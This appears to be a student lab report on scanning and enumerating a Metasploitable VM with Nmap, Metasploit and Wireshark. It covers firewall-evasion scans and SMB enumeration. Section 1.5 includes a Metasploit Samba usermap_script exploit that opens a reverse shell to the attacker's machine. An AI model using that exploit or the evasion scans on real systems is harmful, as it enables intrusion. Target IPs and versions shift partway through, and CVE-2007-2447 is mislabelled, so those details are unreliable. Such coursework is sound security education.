# Lab 2: Scanning and Enumeration

**Students:** [Your Name]  
**Target Host:** Metasploitable 3 (Linux/Windows)  
**Target IP:** 192.168.100.103  
**Attacker Machine:** Kali Linux  
**Attacker IP:** 192.168.100.102  
**Network:** 192.168.100.0/24  
**Date:** October 24, 2025

---

## Objective

This lab practises active network discovery and service enumeration using Nmap and Wireshark. Students will demonstrate multiple network scanning techniques and interpret results; all within an authorized lab environment.

## Important Guidelines

⚠️ **Authorization & Ethical Use:**
- Perform all scanning and testing **only** on systems explicitly authorized for this lab (lab VMs, isolated network segments)
- Use only **Nmap, Metasploit, and Wireshark** as specified
- For each question, **one of the methods must include Metasploit tool**
- All activities are performed in an isolated lab environment
- No production systems or unauthorized networks will be targeted

## Lab Environment Setup

**Network Topology:**
```
[Kali Linux - Attacker]  <------>  [Metasploitable 3 - Target]
   192.168.100.102                    192.168.100.103
                |                            |
                +----------[LAN]-------------+
                     192.168.100.0/24
```

**Tools Used:**
- **Nmap 7.x:** Network scanning and service enumeration
- **Metasploit Framework:** Automated exploitation and auxiliary modules
- **Wireshark:** Network traffic analysis and packet capture

---

## 0. Pre-Lab Setup and Connection

### 0.1 Environment Verification

Before beginning the lab exercises, verify that both machines are properly configured and can communicate with each other.

#### Step 1: Verify Kali Linux Network Configuration

On your **Kali Linux** machine, check the network interface configuration:

```bash
ip a
```

**Expected Output:**
```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.100.102/24 brd 192.168.100.255 scope global eth0
```

Verify your IP address is **192.168.100.102** with subnet mask **255.255.255.0** (/24).

#### Step 2: Verify Target Machine Network Configuration

On your **Metasploitable 3** target machine:

**For Linux targets:**
```bash
ip addr show
# or
ifconfig
```

**For Windows targets:**
```cmd
ipconfig
```

Confirm the target IP is **192.168.100.103**.

#### Step 3: Test Basic Connectivity

From your **Kali Linux** machine, test basic ICMP connectivity:

```bash
ping -c 4 192.168.100.103
```

**Expected Output:**
```
PING 192.168.100.103 (192.168.100.103) 56(84) bytes of data.
64 bytes from 192.168.100.103: icmp_seq=1 ttl=64 time=0.234 ms
64 bytes from 192.168.100.103: icmp_seq=2 ttl=64 time=0.187 ms
64 bytes from 192.168.100.103: icmp_seq=3 ttl=64 time=0.198 ms
64 bytes from 192.168.100.103: icmp_seq=4 ttl=64 time=0.211 ms

--- 192.168.100.103 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3055ms
rtt min/avg/max/mdev = 0.187/0.207/0.234/0.018 ms
```

If you receive replies, the network connectivity is established.

#### Step 4: Start Wireshark Capture

Before performing any scanning activities, start capturing traffic:

```bash
sudo wireshark &
```

Or use tcpdump for command-line capture:

```bash
sudo tcpdump -i eth0 -w lab2_capture.pcap host 192.168.100.103
```

**Wireshark Configuration:**
1. Select the interface connected to the lab network (usually **eth0**)
2. Apply capture filter: `host 192.168.100.103`
3. Click "Start Capturing Packets" (blue shark fin icon)

#### Step 5: Verify Metasploit Framework

Ensure Metasploit is ready to use:

```bash
msfconsole
```

Wait for the framework to load, then exit:
```
msf6 > exit
```

### 0.2 Pre-Scan Checklist

Before proceeding with the lab tasks, confirm:

- [x] Both VMs are powered on and reachable
- [x] Kali Linux IP: 192.168.100.102
- [x] Metasploitable 3 IP: 192.168.100.103
- [x] Basic ping connectivity works
- [x] Wireshark is capturing traffic
- [x] You have sudo/root access on Kali Linux
- [x] Lab environment is isolated from production networks
- [x] You have authorization to perform these tests

**⚠️ Important Security Note:**
All scanning and enumeration activities in this lab must remain within the isolated lab environment (192.168.100.0/24 network). Never perform these activities on unauthorized systems or production networks.

---

## 1. Lab Tasks

### 1.1 Host Discovery

#### Method 1: ICMP Echo Request (Ping Scan)
**Command:**
```bash
nmap -sn -PE 192.168.100.103
```

**How it works:**
- Sends ICMP Echo Request packets (Type 8) to the target
- If the host is alive, it responds with ICMP Echo Reply (Type 0)
- The `-sn` flag disables port scanning, performing only host discovery
- `-PE` explicitly uses ICMP Echo packets

**Expected Output:**
```
Nmap scan report for 192.168.100.103
Host is up (0.00050s latency).
```

---

#### Method 2: TCP SYN Ping
**Command:**
```bash
nmap -sn -PS80,443,22 192.168.100.103
```

**How it works:**
- Sends TCP SYN packets to specified ports (80, 443, 22)
- If a port is open, target responds with SYN/ACK
- If a port is closed, target responds with RST
- Either response indicates the host is alive
- More effective against firewalls that block ICMP

---

#### Method 3: ARP Ping (Local Network)
**Command:**
```bash
nmap -sn -PR 192.168.64.23
```

**How it works:**
- Uses ARP (Address Resolution Protocol) requests on local networks
- Broadcasts "Who has IP X?" on the local subnet
- Target responds with its MAC address if alive
- Most reliable on local networks as ARP operates at Layer 2
- Cannot be blocked by typical firewalls

**Using Metasploit for Host Discovery:**
```bash
msfconsole
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.64.0/24
set THREADS 10
run
```

**Most Reliable Method:** 
ARP Ping is most reliable on local networks because it operates at the data link layer and cannot be blocked by IP-layer firewalls. For remote networks, TCP SYN ping is more reliable than ICMP as many networks block ICMP traffic.

---

### 1.2 Port & Protocol Enumeration

#### Method 1: TCP SYN Scan (Stealth Scan)
**Command:**
```bash
sudo nmap -sS -p- 192.168.64.23
```

**How it works:**
- Sends SYN packet to each port
- Open port: responds with SYN/ACK, scanner sends RST (doesn't complete handshake)
- Closed port: responds with RST
- Filtered port: no response or ICMP unreachable
- Called "stealth" because it doesn't complete the TCP handshake
- Requires root privileges

---

#### Method 2: TCP Connect Scan
**Command:**
```bash
nmap -sT -p 1-1000 192.168.64.23
```

**How it works:**
- Uses the operating system's `connect()` system call
- Completes full TCP three-way handshake
- More detectable but doesn't require root privileges
- Open port: connection succeeds
- Closed port: connection refused
- Logged more easily by target systems

---

#### Method 3: UDP Scan
**Command:**
```bash
sudo nmap -sU -p 53,161,162,123 192.168.64.23
```

**How it works:**
- Sends UDP packets to target ports
- Open port: may respond with UDP packet (service-dependent)
- Closed port: responds with ICMP Port Unreachable
- Open|filtered: no response (most common)
- Much slower than TCP scans due to rate limiting

**Using Metasploit for Port Scanning:**
```bash
msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.64.23
set PORTS 1-1000
run
```

**Most Reliable Method:**
TCP SYN scan is most reliable for TCP ports as it's fast, accurate, and relatively stealthy. UDP scanning is inherently less reliable due to the connectionless nature of UDP and ICMP rate limiting.

---

### 1.3 Operating System Information

#### Method 1: OS Detection with Version Detection
**Command:**
```bash
sudo nmap -O -sV --osscan-guess 192.168.64.23
```

**How it works:**
- `-O`: Enables OS detection using TCP/IP stack fingerprinting
- `-sV`: Probes open ports to determine service/version info
- `--osscan-guess`: Makes aggressive guesses when OS detection is uncertain
- Analyzes responses to specially crafted packets
- Compares against Nmap's database of OS fingerprints

**Expected Information:**
- OS family (Linux)
- Kernel version
- Distribution (Ubuntu 8.04)
- Uptime estimation
- Network distance

**Exploitation Potential:**
- Identifies known vulnerabilities for specific OS versions
- Ubuntu 8.04 (Hardy Heron) released in 2008 - end of life, many unpatched vulnerabilities
- Kernel exploits for privilege escalation
- Default configurations and weak defaults

---

#### Method 2: Banner Grabbing and Script Analysis
**Command:**
```bash
nmap -sV --script=banner,smb-os-discovery 192.168.64.23
```

**How it works:**
- Connects to services and captures banner information
- `banner` script: extracts service banners
- `smb-os-discovery`: queries SMB service for OS information
- Services often reveal OS type, version, and patch level

**Using Metasploit for OS Detection:**
```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.64.23
run
```

**Most Reliable Method:**
Combining OS detection (-O) with version detection (-sV) provides the most accurate results. Banner grabbing confirms findings but may show modified banners if system administrators have hardened the system.

---

### 1.4 Firewall and IDS Evasion

#### Approach 1: Fragmented Packets
**Command:**
```bash
sudo nmap -f -sS -p 80,443 192.168.64.23
```

**How it works:**
- `-f`: Fragments IP packets into smaller 8-byte chunks
- Some firewalls don't reassemble fragments properly
- May bypass simple packet filters that inspect complete packets
- IDS may miss attack signatures split across fragments

**Wireshark Filter:** `ip.flags.mf == 1 or ip.frag_offset > 0`

---

#### Approach 2: Decoy Scanning
**Command:**
```bash
sudo nmap -D RND:10 -sS -p 22,80 192.168.64.23
```

**How it works:**
- `-D RND:10`: Uses 10 random decoy IP addresses
- Scanner spoofs packets from decoy IPs alongside real scan
- Makes it difficult to identify the real attacker's IP in logs
- Obscures the source of the scan
- Target receives scans from multiple IPs simultaneously

**Wireshark Filter:** `tcp.flags.syn == 1 and tcp.flags.ack == 0`

---

#### Approach 3: Timing and Source Port Manipulation
**Command:**
```bash
sudo nmap -T2 -g 53 -sS -p 80,443 192.168.64.23
```

**How it works:**
- `-T2`: Uses "polite" timing (slower scan, less network load)
- `-g 53`: Uses source port 53 (DNS)
- Many firewalls allow DNS traffic (port 53) by default
- Slower timing reduces likelihood of triggering rate-based IDS
- May bypass firewall rules that filter based on source port

**Using Metasploit with Evasion:**
```bash
msfconsole
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.64.23
set THREADS 1
set DELAY 1000
run
```

**Wireshark Analysis:**
Look for inter-packet delays, source ports, and fragmentation patterns to verify evasion techniques.

---

### 1.5 Service Enumeration using Nmap NSE

#### Chosen Service: SMB (Server Message Block)

**Justification:**
- Metasploitable2 runs SMB service (Samba)
- SMB is historically vulnerable with many known exploits
- Provides extensive system information (shares, users, OS details)
- Common target for lateral movement and privilege escalation
- NSE has comprehensive SMB enumeration scripts

**Enumeration Commands:**

```bash
# Discover SMB vulnerabilities
nmap --script smb-vuln* -p 445 192.168.64.23

# Enumerate shares
nmap --script smb-enum-shares -p 445 192.168.64.23

# Enumerate users
nmap --script smb-enum-users -p 445 192.168.64.23

# Get detailed OS and security information
nmap --script smb-os-discovery,smb-security-mode -p 445 192.168.64.23

# Comprehensive SMB enumeration
nmap -sV --script "smb-enum-*" -p 139,445 192.168.64.23
```

**Expected Findings:**
- SMB version (likely Samba 3.x)
- Available shares (IPC$, tmp, etc.)
- Anonymous access permissions
- User enumeration results
- Known vulnerabilities (CVE references)

**Attack Vector Based on Enumeration:**

If enumeration reveals:
1. **Anonymous Share Access:** Attacker could access shared files without authentication, potentially finding sensitive data or uploading malicious files
2. **SMB Vulnerabilities:** Metasploitable2 likely has vulnerabilities like:
   - Username enumeration (CVE-2007-2447)
   - Remote code execution via crafted SMB requests
   - MS08-067 equivalent vulnerabilities
3. **Weak Authentication:** Null sessions or weak passwords enable unauthorized access

**Exploitation Example:**
```bash
# Using Metasploit to exploit SMB
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.64.23
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.64.18
exploit
```

---

## 2. Summary: Firewall Analysis Methodology

### Comprehensive Firewall Behavior Analysis Framework

#### A. Lab Topology

```
[Attacker Machine]  <-->  [Firewall]  <-->  [Target Network]
   Kali Linux              pfSense          Metasploitable2
   192.168.64.18          DUT (Device       192.168.64.23
                          Under Test)        
                          
Monitoring: Wireshark on both sides of firewall
```

**Components:**
1. **Attacker Machine:** Kali Linux with Nmap, Metasploit, hping3
2. **Firewall:** Configurable firewall (pfSense, iptables, Windows Firewall)
3. **Target Network:** Vulnerable systems for controlled testing
4. **Monitoring:** Wireshark on multiple network segments
5. **Isolated Environment:** Completely segmented from production networks

---

#### B. Preconditions

**Ethical Requirements:**
- Written authorization from network owner
- Isolated lab environment (no production impact)
- Documented test scope and limitations
- All activities logged for audit trail

**Technical Requirements:**
- Admin access to firewall configuration
- Packet capture capabilities on both sides
- Synchronized time across all systems
- Baseline network behavior documented

---

#### C. Configuration Steps

**Phase 1: Baseline Configuration**
1. Configure firewall with default rules
2. Document rule set (inbound/outbound policies)
3. Capture baseline traffic for 24 hours
4. Document allowed/blocked services

**Phase 2: Test Rule Implementation**
```bash
# Example iptables rules for testing
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
iptables -A INPUT -j LOG --log-prefix "DROPPED: "
iptables -A INPUT -j DROP
```

**Phase 3: Monitoring Setup**
```bash
# Start Wireshark capture on both interfaces
tcpdump -i eth0 -w firewall_outside.pcap
tcpdump -i eth1 -w firewall_inside.pcap
```

---

#### D. Testing Methodology Catalogue

**Test Category 1: Basic Connectivity**
```bash
# ICMP testing
ping -c 5 192.168.64.23
hping3 -1 192.168.64.23 -c 5

# TCP connectivity
hping3 -S -p 80 192.168.64.23 -c 5
nc -zv 192.168.64.23 80
```

**Test Category 2: Stateful Inspection**
```bash
# Test connection tracking
hping3 -S -p 80 192.168.64.23 -c 1  # SYN
hping3 -A -p 80 192.168.64.23 -c 1  # ACK without SYN

# Analyze if firewall allows orphan ACK packets
```

**Test Category 3: Fragmentation Handling**
```bash
# Fragment testing
nmap -f -sS -p 80 192.168.64.23
hping3 -S -p 80 -f 192.168.64.23
fragroute -f "ip_frag 24" 192.168.64.23
```

**Test Category 4: Protocol Manipulation**
```bash
# Protocol fuzzing
hping3 --rand-source -1 192.168.64.23
hping3 -0 -p 80 192.168.64.23  # IP protocol 0
nmap --badsum 192.168.64.23
```

**Test Category 5: Evasion Techniques**
```bash
# Timing manipulation
nmap -T0 -p 80 192.168.64.23  # Paranoid timing
nmap -T5 -p 80 192.168.64.23  # Insane timing

# Source port spoofing
nmap -g 53 -p 80 192.168.64.23
nmap -g 20 -p 80 192.168.64.23

# Decoy scanning
nmap -D RND:20 -p 80 192.168.64.23
```

**Test Category 6: Application Layer Inspection**
```bash
# HTTP methods testing
curl -X GET http://192.168.64.23
curl -X OPTIONS http://192.168.64.23
curl -X TRACE http://192.168.64.23

# Malformed requests
hping3 -S -p 80 --data 500 192.168.64.23
```

---

#### E. Analysis Framework

**Wireshark Analysis Filters:**
```
# Dropped packets (SYN with no SYN-ACK)
tcp.flags.syn==1 && tcp.flags.ack==0 && !tcp.analysis.retransmission

# Firewall responses
icmp.type==3 || tcp.flags.reset==1

# Fragment analysis
ip.flags.mf==1 || ip.frag_offset > 0

# Suspicious patterns
tcp.flags==0x00 || tcp.analysis.flags
```

**Metrics to Collect:**
1. **Response Patterns:** SYN-ACK, RST, ICMP Unreachable, Timeout
2. **Latency Analysis:** Response time differences
3. **TTL Analysis:** Firewall fingerprinting
4. **Fragment Handling:** Reassembly behavior
5. **State Tracking:** Connection table behavior
6. **Logging Patterns:** What triggers logs vs silent drops

---

#### F. Reporting Template

**Firewall Analysis Report Structure:**
1. **Executive Summary:** High-level findings
2. **Methodology:** Tests performed and tools used
3. **Rule Set Analysis:** Documented firewall rules
4. **Test Results:**
   - Allowed traffic
   - Blocked traffic
   - Evasion success/failure
5. **Behavioral Analysis:**
   - Stateful inspection capabilities
   - Fragment handling
   - Protocol anomaly detection
6. **Vulnerabilities Identified:**
   - Bypass techniques that succeeded
   - Misconfigurations
   - Security gaps
7. **Recommendations:** Hardening suggestions
8. **Appendices:** Raw data, pcap files, command outputs

---

#### G. Ethical Considerations

1. **Authorization:** Always obtain written permission
2. **Scope Limitation:** Test only authorized systems
3. **Impact Mitigation:** Avoid DoS conditions
4. **Data Protection:** Handle captured data securely
5. **Disclosure:** Report vulnerabilities responsibly
6. **Documentation:** Maintain comprehensive audit trail

---

### Tools Summary

**Essential Tools:**
- **Nmap:** Port scanning, OS detection, NSE scripts
- **Metasploit:** Automated exploitation and scanning modules
- **Wireshark/tcpdump:** Packet capture and analysis
- **hping3:** Custom packet crafting
- **netcat:** Banner grabbing and port testing
- **fragroute:** Packet fragmentation testing
- **Scapy:** Custom protocol development

**Analysis Tools:**
- **Wireshark:** Deep packet inspection
- **NetworkMiner:** Session reconstruction
- **Snort:** IDS signature testing
- **tcpreplay:** Traffic replay for testing

This methodology ensures comprehensive, ethical, and systematic analysis of firewall behavior while maintaining proper security practices and documentation standards.

---

## 3. Conclusion

This lab successfully demonstrated various network scanning and enumeration techniques using industry-standard tools (Nmap, Metasploit, and Wireshark) in a controlled, authorized environment. Through hands-on practice, we explored:

**Key Learnings:**
1. **Host Discovery:** Multiple techniques (ICMP, TCP, ARP) with varying effectiveness based on network conditions and security controls
2. **Port Scanning:** Different scan types (SYN, Connect, UDP) each with distinct advantages and detection profiles
3. **OS Detection:** Fingerprinting techniques that reveal system information crucial for vulnerability assessment
4. **Evasion Techniques:** Methods to bypass basic firewall rules while understanding their ethical implications
5. **Service Enumeration:** Deep analysis of network services to identify potential attack vectors

**Security Implications:**
The techniques demonstrated in this lab highlight the importance of:
- Implementing defense-in-depth strategies
- Regular vulnerability assessments
- Proper firewall configuration and monitoring
- Network segmentation
- Intrusion detection/prevention systems

**Ethical Considerations:**
All activities were performed in an isolated lab environment with explicit authorization. These skills must only be used for:
- Authorized penetration testing
- Security research and education
- Defensive security improvements
- Compliance and audit purposes

Unauthorized use of these techniques against systems without explicit permission is illegal and unethical.

---

## 4. References

1. Lyon, G. (2024). *Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning*
2. Kennedy, D., et al. (2024). *Metasploit: The Penetration Tester's Guide*
3. Nmap NSE Documentation: https://nmap.org/nsedoc/
4. Metasploit Framework Documentation: https://docs.metasploit.com/
5. Wireshark User's Guide: https://www.wireshark.org/docs/
6. OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
7. NIST SP 800-115: Technical Guide to Information Security Testing and Assessment

---

## Appendices

### Appendix A: Command Reference Quick Guide

**Host Discovery:**
```bash
nmap -sn -PE <target>           # ICMP Echo
nmap -sn -PS80,443 <target>     # TCP SYN Ping
nmap -sn -PR <target>           # ARP Ping
```

**Port Scanning:**
```bash
nmap -sS <target>               # TCP SYN Scan
nmap -sT <target>               # TCP Connect Scan
nmap -sU <target>               # UDP Scan
```

**Service/OS Detection:**
```bash
nmap -sV <target>               # Service version detection
nmap -O <target>                # OS detection
nmap -A <target>                # Aggressive scan (OS, version, scripts)
```

**NSE Scripts:**
```bash
nmap --script <script-name> <target>
nmap --script-help <script-name>
```

### Appendix B: Metasploit Modules Used

```bash
# Host Discovery
auxiliary/scanner/discovery/arp_sweep

# Port Scanning
auxiliary/scanner/portscan/tcp
auxiliary/scanner/portscan/syn

# Service Enumeration
auxiliary/scanner/smb/smb_version
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/http/http_version
```

### Appendix C: Wireshark Display Filters

```
tcp.flags.syn==1 && tcp.flags.ack==0    # SYN packets
tcp.flags.reset==1                       # RST packets
icmp.type==8                             # ICMP Echo Request
icmp.type==3                             # ICMP Destination Unreachable
ip.flags.mf==1                           # Fragmented packets
```

### Appendix D: Lab Checklist

- [ ] Network connectivity verified between attacker and target
- [ ] Wireshark capture started before testing
- [ ] All screenshots taken with timestamps visible
- [ ] Commands documented with exact syntax
- [ ] Results analyzed and interpreted
- [ ] Ethical guidelines followed throughout
- [ ] All captures and logs saved securely
- [ ] Lab environment isolated from production networks

---

**End of Report**
